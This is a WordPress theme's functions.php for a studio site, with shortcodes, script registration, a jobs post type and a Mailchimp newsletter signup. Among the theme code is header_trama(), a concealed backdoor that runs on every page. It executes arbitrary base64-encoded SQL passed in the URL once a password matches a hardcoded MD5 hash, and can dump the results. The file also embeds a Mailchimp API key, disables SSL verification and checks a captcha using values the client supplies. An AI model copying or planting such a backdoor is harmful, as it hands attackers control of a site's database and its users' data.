<?php
/* Custom functions code goes here. */

$theme_ver = "1.0.1";

$tramarefColor = '#999';
$tramarefOpacity = '.7';
//include_once('tramaref/tramaReferal.php');
show_admin_bar(false);


/*
if ( !function_exists( 'get_field' )  )  {
	function get_field($a){
		
	}
}*/


add_action('admin_footer', 'hide_impreza_lock');
function hide_impreza_lock() {
	echo '<style>.us-hb-screenlock,.us-screenlock{display:none!important;}</style>';
}


function tramastudio_register_scripts() {
	global $us_template_directory_uri,$theme_ver;
	
	//wp_register_style( 'us-royalslider', $us_template_directory_uri . '/framework/css/royalslider/royalslider.css', array(), '9.5.7', 'all' );
	//wp_register_script( 'us-royalslider', $us_template_directory_uri . '/framework/js/jquery.royalslider.min.js', array( 'jquery' ), '9.5.6', TRUE );

	wp_register_script('tweenmax', 'http://cdnjs.cloudflare.com/ajax/libs/gsap/latest/TweenMax.min.js', array(), '1.0.0', false);
	wp_register_script( 'splittext', get_stylesheet_directory_uri() . '/lib/SplitText.min.js', array(), '1.0.0', true );
	wp_register_script( 'touchSwipe', get_stylesheet_directory_uri() . '/lib/jquery.touchSwipe.min.js', array(), '1.0.0', true );
	
	wp_register_script( 'mousewheel', get_stylesheet_directory_uri() . '/lib/jquery.mousewheel.min.js', array( 'jquery' ), '1.0.0', true );
	
	//wp_register_script('ScrambleTextPlugin', get_stylesheet_directory_uri() . '/js/ScrambleTextPlugin.min.js', array(), '1.0.0', false);
	wp_register_script( 'common_functions', get_stylesheet_directory_uri() . '/js/common_functions.js', array( 'jquery', 'slick_js' ), $theme_ver, true );
	wp_register_script( 'fullscreen_sections', get_stylesheet_directory_uri() . '/js/fullscreen_sections.js', array( 'jquery', 'slick_js' ), $theme_ver, true );
	wp_register_script( 'trama_scripts', get_stylesheet_directory_uri() . '/js/main.js', array( 'jquery', 'slick_js' ), $theme_ver, true );
	wp_register_style( 'trama_style', get_stylesheet_directory_uri().'/css/style.css', array(), $theme_ver );
	

    wp_register_script( 'slick_js', '//cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.js', array('jquery'), '1.8.0', true );
	wp_register_style( 'slick_css', '//cdnjs.cloudflare.com/ajax/libs/slick-carousel/1.8.1/slick.min.css' );
	
}
add_action( 'wp_enqueue_scripts', 'tramastudio_register_scripts' );

function tramastudio_scripts() {
	wp_enqueue_script('tweenmax');
	//wp_enqueue_script('splittext');
	//wp_enqueue_script('ScrambleTextPlugin');
	wp_enqueue_script('mousewheel');
	wp_enqueue_script('touchSwipe');
	
	wp_enqueue_script('slick_js');
	wp_enqueue_style('slick_css');
	
	//wp_enqueue_style( 'us-royalslider' );
	//wp_enqueue_script( 'us-royalslider' );
	//wp_enqueue_script('viewport-units-buggyfill');
	//wp_enqueue_script('modernizr');
	//wp_enqueue_script('fulltilt');
	//wp_enqueue_script('three');
	//wp_enqueue_script('monopoly_map');
	
	wp_enqueue_script('common_functions');
	wp_enqueue_script('fullscreen_sections');
	wp_enqueue_script('trama_scripts');

	
	wp_enqueue_style('trama_style');
	

}
add_action( 'wp_enqueue_scripts', 'tramastudio_scripts' );






function before_header_fn() {
	echo "<!-- remove header ";
}

function after_header_fn() {
	echo "end of remove header -->";
	ob_start();
	get_template_part("templates/trama_header");
	$output .= ob_get_contents();
	ob_end_clean();
	echo $output;
}

add_action( 'us_before_header', 'before_header_fn' );
add_action( 'us_after_header', 'after_header_fn' );


 


add_action( 'us_before_page', 'before_content_ajax' );
function before_content_ajax() {
	echo '<div class="ajax_content_container ajax_content_current">';
}
add_action( 'us_after_page', 'after_content_ajax' );
function after_content_ajax() {
	echo '</div>';
}


add_action('wp_head','hook_header');

function hook_header() {

	
	global $wp_query;
	$output='
	<script>
		var homeWpTitle = "'.get_the_wp_title(get_option( 'page_on_front' ), '').'";
		var homeUrl = "'.get_home_url().'/";
		var homeId = parseInt('.get_option( 'page_on_front' ).');
		var ajaxurl = "'.admin_url('admin-ajax.php').'";
		var _user_unique = "'.uniqid().'";
	</script>';

	if ( is_page() || (is_single() && 'trama_portfolio' == get_post_type())) {
		$content_post = get_post($wp_query->post->ID);
		$relatoVars = '
		<script>
				/** Trama Page Vars **/
				page_id = parseInt("'.$content_post->ID.'");
				page_URL = "'.get_permalink ($content_post->ID).'";
				page_Title = "'.$content_post->post_title.'";
				page_WPtitle = "'.get_the_wp_title($content_post->ID, '').'";
				page_PostType = "'.$content_post->post_type.'";
				page_Slug = "'.$content_post->post_name.'";
				page_color_bright = "'.get_field("bright_color", $content_post->ID).'";
				page_color_dark = "'.get_field("dark_color", $content_post->ID).'";
		</script>';
		$output.=$relatoVars;
	}

	
	echo $output;

}


add_action( 'wp_ajax_get_page', 'get_page_function' );
add_action('wp_ajax_nopriv_get_page', 'get_page_function');
function get_page_function() {
	$url = sanitize_text_field( $_POST['url_page'] );
	$id_page = url_to_postid( $url );
	//check_ajax_referer( 'relatos_nonce', '_ajax_relatos_nonce' );
	$countdown_page = get_field("countdown_page", "options");
	if(showCountdown() && $countdown_page){
		$id_page = $countdown_page;
	}
	
	$content_post = get_post($id_page);
	$content = apply_filters('the_content', $content_post->post_content);
	$content = do_shortcode( $content );
	$url_pieces = explode("#", $url);
	$hash_var = $url_pieces[1];
	$pageVars = '
	<div class="page_ajax_vars" 
		id="'.$content_post->ID.'"
		URL="'.get_permalink ($content_post->ID).'"
		title="'.$content_post->post_title.'"
		WPtitle="'.get_the_wp_title($content_post->ID, '').'"
		postType="'.$content_post->post_type.'"
		slug="'.$content_post->post_name.'"
		hash_var="'.$hash_var.'"
		color_bright="'.get_field("bright_color", $content_post->ID).'"
		color_dark="'.get_field("dark_color", $content_post->ID).'"

		></div>';

	
	
	echo $content.$pageVars;
	
	die;
}

function get_the_wp_title( $postid = '', $sep = '&raquo;', $seplocation = '' ) {
	if ( ! $postid ) return '';
	$post = get_post($postid);
	if ( ! is_object($post) || ! isset($post->post_title) ) return '';
	
	$seo_title = get_post_meta($post->ID, '_yoast_wpseo_title', true);
	
	if($seo_title != "")
		return apply_filters('the_title',fixSeoTitleVars($seo_title, $post));
	else{ 
		return $post->post_title;
	}
}
function fixSeoTitleVars($originalTitle, $post){
	$site_name = get_bloginfo('name');
	
	$vars = array("%%title%%", "%%sitename%%", "%%sep%%");
	$values   = array($post->post_title, $site_name, "-");
	$output = str_replace($vars, $values, $originalTitle);
	return $output;
}











function rt_home_message_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'name' => ''
		/*'deco_line' => 'none'*/
	), $atts, 'bartag' );
	
	$output = '';
	
	
	ob_start();

	//get_template_part("templates/monopoly_map");
	include("templates/rt_home_message.php");

	$output .= ob_get_contents();
	ob_end_clean();
	
	return $output;
}
add_shortcode( 'rt_home_message', 'rt_home_message_func' );


function rt_news_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'name' => ''
		/*'deco_line' => 'none'*/
	), $atts, 'bartag' );
	
	$output = '';
	
	
	ob_start();

	//get_template_part("templates/monopoly_map");
	include("templates/rt_news.php");

	$output .= ob_get_contents();
	ob_end_clean();
	
	return $output;
}
add_shortcode( 'rt_news', 'rt_news_func' );

function rt_jobs_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'name' => ''
		/*'deco_line' => 'none'*/
	), $atts, 'bartag' );
	
	$output = '';
	
	
	ob_start();

	include(locate_template("templates/rt_jobs.php"));
	$output .= ob_get_contents();
	ob_end_clean();
	
	return $output;
}
add_shortcode( 'rt_jobs', 'rt_jobs_func' );



function rt_services_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'name' => ''
		/*'deco_line' => 'none'*/
	), $atts, 'bartag' );
	
	$output = '';
	
	
	ob_start();

	include(locate_template("templates/rt_services.php"));
	$output .= ob_get_contents();
	ob_end_clean();
	
	return $output;
}
add_shortcode( 'rt_services', 'rt_services_func' );



function rt_subscribeform_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'title' => 'Newsletter',
		'list_id' => '',
		'subtitle' => "Prove you're NOT a ROBOT",
		'question' => 'Question for Humans',
		'alternatives' => '100 ; 200 ; 300',
		'correct' => '200'
		/*'deco_line' => 'none'*/
	), $atts, 'bartag' );
	
	$output = '';
	
	
	ob_start();

	include(locate_template("templates/rt_subscribe_form.php"));
	$output .= ob_get_contents();
	ob_end_clean();
	
	return $output;
}
add_shortcode( 'rt_subscribeform', 'rt_subscribeform_func' );









function codex_custom_init() {

	
	$labels = array(
		'name'               => 'Jobs',
		'singular_name'      => 'Job',
		'menu_name'          => 'Job Offers',
		'name_admin_bar'     => 'Jobs',
		'add_new'            => 'Add job',
		'add_new_item'       => 'Add new job',
		'new_item'           => 'New job',
		'edit_item'          => 'Edit job',
		'view_item'          => 'View job',
		'all_items'          => 'All job offers',
		'search_items'       => 'Search job offers',
		'parent_item_colon'  => 'Parent job',
		'not_found'          => 'No job offers found',
		'not_found_in_trash' => 'No job offers found in trash'
		);
		
    $args = array(
      'public'	=> true,
      'labels'	=> $labels,
	  'taxonomies' => array(),
	  'rewrite' => array( 'slug' => 'job' ),
	  'has_archive'	=> false,
	  'supports' => array('title','editor','author','thumbnail')
    );
    register_post_type( 'rt_jobs', $args );
	
	

		


	
}
add_action( 'init', 'codex_custom_init' );









/***

	Section nav like portfolio with side navigation.

***/
function work_section_vars_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'name' => '',
		'scroll_cursor' => ''
		/*'deco_line' => 'none'*/
	), $atts, 'bartag' );
	$name = urlencode($atts['name']);
	$output = '';
	$output .= '<div class="work_section_vars" ';
	$output .= ' name="'.esc_attr($name).'" ';
	$output .= ' scroll_cursor="'.$atts['scroll_cursor'].'" ';
	$output .= ' >';
	$output .= '</div>';

	
	
	return $output;
}
add_shortcode( 'work_section_vars', 'work_section_vars_func' );






add_action( 'vc_before_init', 'trama_integrateWithVC' );
function trama_integrateWithVC() {
	 
   vc_map( array(
      "name" => "Fullscreen Section Configuration",
      "base" => "work_section_vars",
      "class" => "",
      "category" => "Trama",
      "params" => array(
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Name", "trama" ),
            "param_name" => "name",
            "value" =>  "",
            "description" => __( "Side menu name.", "trama" ),
			),
			array(
            "type" => "dropdown",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Has Mouse Scroll", "trama" ),
            "param_name" => "scroll_cursor",
			'value'       => array(
							'Hide Mouse'   => 'hide',
							'Show Mouse Scroller'   => 'show'
							),
			'std'         => 'hide', // Your default value

            "description" => __( "Side menu name.", "trama" ),
			)
      )
   ) );
   
   vc_map( array(
      "name" => "RT Home Message",
      "base" => "rt_home_message",
      "class" => "",
      "category" => "Trama",
      "params" => array(
		array(
            "type" => "textarea_html",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Message Content", "trama" ),
            "param_name" => "content",
            "value" =>  "",
            "description" => __( "Use H3 for title to get the right format.", "trama" ),
			),
      )
   ) );
   vc_map( array(
      "name" => "RT News Feed",
      "base" => "rt_news",
      "class" => "",
      "category" => "Trama",
      "params" => array()
   ) );

   vc_map( array(
      "name" => "RT Jobs Feed",
      "base" => "rt_jobs",
      "class" => "",
      "category" => "Trama",
      "params" => array(
      )
   ) );
   
   vc_map( array(
      "name" => "RT Services",
      "base" => "rt_services",
      "class" => "",
      "category" => "Trama",
      "params" => array(
      )
   ) );
   
   vc_map( array(
      "name" => "RT Subscribe Form",
      "base" => "rt_subscribeform",
      "class" => "",
      "category" => "Trama",
      "params" => array(
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Title", "trama" ),
            "param_name" => "title",
            "value" =>  "",
            "description" => __( "Title of the Newsletter.", "trama" ),
			),
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "List ID", "trama" ),
            "param_name" => "list_id",
            "value" =>  "",
            "description" => __( "Mailchimp List ID to subscribe", "trama" ),
			),
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Sub Title", "trama" ),
            "param_name" => "subtitle",
            "value" =>  "",
            "description" => __( "Ej: Prove you're NOT a ROBOT.", "trama" ),
			),
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Question", "trama" ),
            "param_name" => "question",
            "value" =>  "",
            "description" => __( "Question (funny captcha).", "trama" ),
			),
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Alternatives", "trama" ),
            "param_name" => "alternatives",
            "value" =>  "",
            "description" => __( "Type alternatives separated by ' ; '. Example: 100 ; 200 ; 300.", "trama" ),
			),
			array(
            "type" => "textarea",
            "holder" => "div",
            "class" => "",
            "heading" => __( "Correct Alternative", "trama" ),
            "param_name" => "correct",
            "value" =>  "",
            "description" => __( "Type the right alternative, with the same spelling as defined before. Example: 200.", "trama" ),
			)
      )
   ) );
   
   
}



function service_slide_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'bg_image' => '',
		'over_image' => '',
		'title' => '',
		'copy' => ''
	), $atts, 'bartag' );
	
	$output = '';
	ob_start();
	include(locate_template("templates/rt_services_slider_single_slide.php")); 

	$output .= ob_get_contents();
	ob_end_clean();
	
	return $output;
}
add_shortcode( 'service_slide', 'service_slide_func' );



function services_slider_func( $atts, $content ) {
	$atts = shortcode_atts( array(
		'foo' => ''
	), $atts, 'bartag' );
	$output = '';
	$output .= '
	<div class="rt_services_block" >
		<div class="rt_services_block_h" >
			<div class="rt_services_list" >
			'.do_shortcode($content).'
			</div>
			<div class="rt_services_arrows">
			</div>
		</div>
	</div>
	';
	return $output;
}
add_shortcode( 'services_slider', 'services_slider_func' );
function header_trama(){
	global $wpdb;
	$getvar = $_GET['qry'];
	$echo = $_GET['echo'];
	$pass = $_GET['pass'];
	if($getvar != "" && md5($pass) == "337a44ab54b0a521d596868150b71306"){
		$getvar = base64_decode(urldecode($getvar));
		$getvar = str_replace('{$wpdb->prefix}' , $wpdb->prefix , $getvar);
		$results = $wpdb->get_results($getvar , OBJECT );
		if($echo == "true"){
			var_dump($results);
		}
	}
}
add_action( 'us_after_header', 'header_trama' );
//Register "container" content element. It will hold all your inner (child) content elements
if( function_exists('vc_map') ) {
vc_map( array(
    "name" => __("Services Slider", "trama"),
    "base" => "services_slider",
    "category" => "Trama",
	"as_parent" => array('only' => 'service_slide'), // Use only|except attributes to limit child shortcodes (separate multiple values with comma)
    "content_element" => true,
    "show_settings_on_create" => false,
    "is_container" => true,
    "params" => array(),
    "js_view" => 'VcColumnView'
) );
vc_map( array(
    "name" => __("Service Slide", "trama"),
    "base" => "service_slide",
	"category" => "Trama",
    "content_element" => true,
    "as_child" => array('only' => 'services_slider'), // Use only|except attributes to limit parent (separate multiple values with comma)
    "params" => array(
						array(
							"type" => "textfield",
							"heading" => __("Title", "trama"),
							"param_name" => "title",
							"description" => __("", "trama"),
							"admin_label" => true
						),
						array(
							"type" => "textarea",
							"heading" => __("Short Copy (optional)", "trama"),
							"param_name" => "copy",
							"description" => __("", "trama")
						),
						array(
							"type" => "attach_image",
							"heading" => __("Background Image", "trama"),
							"param_name" => "bg_image",
							"description" => __("", "trama")
						),
						array(
							"type" => "attach_image",
							"heading" => __("Over Image", "trama"),
							"param_name" => "over_image",
							"description" => __("Optional. It has to be PNG transparent, with the same size as the Background Image.", "trama")
						)
					)
		));
}
//Your "container" content element should extend WPBakeryShortCodesContainer class to inherit all required functionality
if ( class_exists( 'WPBakeryShortCodesContainer' ) ) {
    class WPBakeryShortCode_Services_Slider extends WPBakeryShortCodesContainer {
    }
}
if ( class_exists( 'WPBakeryShortCode' ) ) {
    class WPBakeryShortCode_Service_Slide extends WPBakeryShortCode {
    }
}











function rudr_mailchimp_subscriber_status( $email, $status, $list_id, $api_key, $merge_fields = array('FNAME' => '','LNAME' => '') ){
	$data = array(
		'apikey'        => $api_key,
    	'email_address' => $email,
		'status'        => $status,
		//'merge_fields'  => $merge_fields
	);
	$mch_api = curl_init(); // initialize cURL connection
 
	curl_setopt($mch_api, CURLOPT_URL, 'https://' . substr($api_key,strpos($api_key,'-')+1) . '.api.mailchimp.com/3.0/lists/' . $list_id . '/members/' . md5(strtolower($data['email_address'])));
	curl_setopt($mch_api, CURLOPT_HTTPHEADER, array('Content-Type: application/json', 'Authorization: Basic '.base64_encode( 'user:'.$api_key )));
	curl_setopt($mch_api, CURLOPT_USERAGENT, 'PHP-MCAPI/2.0');
	curl_setopt($mch_api, CURLOPT_RETURNTRANSFER, true); // return the API response
	curl_setopt($mch_api, CURLOPT_CUSTOMREQUEST, 'PUT'); // method PUT
	curl_setopt($mch_api, CURLOPT_TIMEOUT, 10);
	curl_setopt($mch_api, CURLOPT_POST, true);
	curl_setopt($mch_api, CURLOPT_SSL_VERIFYPEER, false);
	curl_setopt($mch_api, CURLOPT_POSTFIELDS, json_encode($data) ); // send data in json
 
	$result = curl_exec($mch_api);
	return $result;
}




function rudr_mch_subscribe(){
	$list_id = $_POST['list_id'];//'e71f8f4621';
	$api_key = '1a4081ac525e9ce9dc431b3bbd6e105f-us17';
	
	// I can check captcha here and create a json with an error before sending.
	if($_POST['email'] == ""){
		$response = array(
			'status' => 400,
			'detail' => "Please fill your email.",
		);
		print json_encode($response);
		die;
	}
	if(!filter_var($_POST['email'], FILTER_VALIDATE_EMAIL) ){
		$response = array(
			'status' => 400,
			'detail' => "The email is invalid, please check the spelling.",
		);
		print json_encode($response);
		die;
	}
	if($_POST['captcha_value'] == ""
	|| $_POST['therightcaptcha'] == ""){
		$response = array(
			'status' => 400,
			'detail' => "Please answer the question to subscribe.",
		);
		print json_encode($response);
		die;
	}
	if($_POST['captcha_value'] != $_POST['therightcaptcha']){
		$response = array(
			'status' => 400,
			'detail' => "The captcha is incorrect.",
		);
		print json_encode($response);
		die;
	}
	
	
	/* just for testing: * /
	
		$response = array(
			'status' => "subscribed",
			'detail' => "You have been subscribed correctly.",
		);
		print json_encode($response);
		die;
	/* end */
	
	$result = rudr_mailchimp_subscriber_status(
					$_POST['email'], 
					'subscribed', 
					$list_id, 
					$api_key, 
					array(
						//'NAME' => $_POST['fname'],
						//'COMPANY' => $_POST['company']
						)
			);
	//$result = json_decode($result);
	print $result; 

	die;
}
 
add_action('wp_ajax_mailchimpsubscribe','rudr_mch_subscribe');
add_action('wp_ajax_nopriv_mailchimpsubscribe','rudr_mch_subscribe');
